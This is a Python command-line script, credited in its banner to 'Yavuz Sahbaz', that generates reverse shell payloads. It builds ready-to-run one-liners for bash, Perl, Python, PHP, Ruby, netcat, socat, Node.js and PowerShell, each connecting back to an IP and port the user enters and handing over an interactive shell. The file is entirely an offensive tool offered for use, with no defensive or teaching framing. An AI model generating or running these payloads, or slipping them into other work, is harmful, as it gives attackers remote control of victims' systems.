#!/usr/bin/env python3
#Yavuz Sahbaz Reverse shell payload generators

print("\033[1;36m" + r"""
 ,---,---,---,---,---,---,---,---,---,---,---,---,
| Y | a | v | u | z |   | S | a | h | b | a | z |   |
|---'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-|
|     ___                                             __
|   /   \           ___ ___   ____ ___  ____   _____/  |_
|   \_   \   ______\  \\  \_/ ___\\  \/  /  _ \ /    \   __\
|   /   /  /_____/  >  <\___ \\___ \>    <\_\ \_\   |  |
|  /___/           /__/ /____/_____/__/\_ \___  /___|  /
|                                       \/    \/     \/
|---,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'--|
| Y | a | v | u | z |   | S | a | h | b | a | z |   |
 `---'---'---'---'---'---'---'---'---'---'---'---'---'
""" + "\033[0m")


# Linux payload generators
def bash_reverse_shell(ip, port):
    return f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"

def perl_reverse_shell(ip, port):
    return f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"

def python_reverse_shell(ip, port):
    return f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"

def php_reverse_shell(ip, port):
    return f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"

def ruby_reverse_shell(ip, port):
    return f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"

def netcat_reverse_shell(ip, port):
    return f"nc -e /bin/sh {ip} {port}"

def socat_reverse_shell(ip, port):
    return f"socat TCP:{ip}:{port} EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane"

def nodejs_reverse_shell(ip, port):
    return f"node -e 'require(\"child_process\").exec(\"bash -c \\\"bash -i >& /dev/tcp/{ip}/{port} 0>&1\\\"\")'"

# Windows payload generators
def powershell_reverse_shell(ip, port):
    return f"powershell -NoP -C \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}; $client.Close()\""
def windows_python_reverse_shell(ip, port):
    return f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"cmd.exe\"]);'"

def windows_ruby_reverse_shell(ip, port):
    return f"ruby -rsocket -e'c=TCPSocket.new(\"{ip}\",{port});while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'"

def windows_nodejs_reverse_shell(ip, port):
    return f"node -e 'require(\"child_process\").exec(\"cmd.exe /K \\\"cmd.exe /c <&3 >&3 2>&3\\\"\")'"

linux_payload_generators = {
    "bash": bash_reverse_shell,
    "perl": perl_reverse_shell,
    "python": python_reverse_shell,
    "php": php_reverse_shell,
    "ruby": ruby_reverse_shell,
    "netcat": netcat_reverse_shell,
    "socat": socat_reverse_shell,
    "nodejs": nodejs_reverse_shell,
}

windows_payload_generators = {
    "powershell": powershell_reverse_shell,
    "windows_python": windows_python_reverse_shell,
    "windows_ruby": windows_ruby_reverse_shell,
    "windows_nodejs": windows_nodejs_reverse_shell,
}

print("Available reverse shell payload generators for Linux:")
for key in linux_payload_generators:
    print(f"- {key}")

print("\nAvailable reverse shell payload generators for Windows:")
for key in windows_payload_generators:
    print(f"- {key}")

language = input("Enter the language for the reverse shell payload: ").lower()

if language in linux_payload_generators or language in windows_payload_generators:
    ip = input("Enter IP address: ")
    port = input("Enter Port number: ")

    if language in linux_payload_generators:
        payload = linux_payload_generators[language](ip, port)
    else:
        payload = windows_payload_generators[language](ip, port)

    print(f"\n{language.capitalize()} Reverse Shell Payload:")
    print(payload)
else:
    print("Invalid language.")
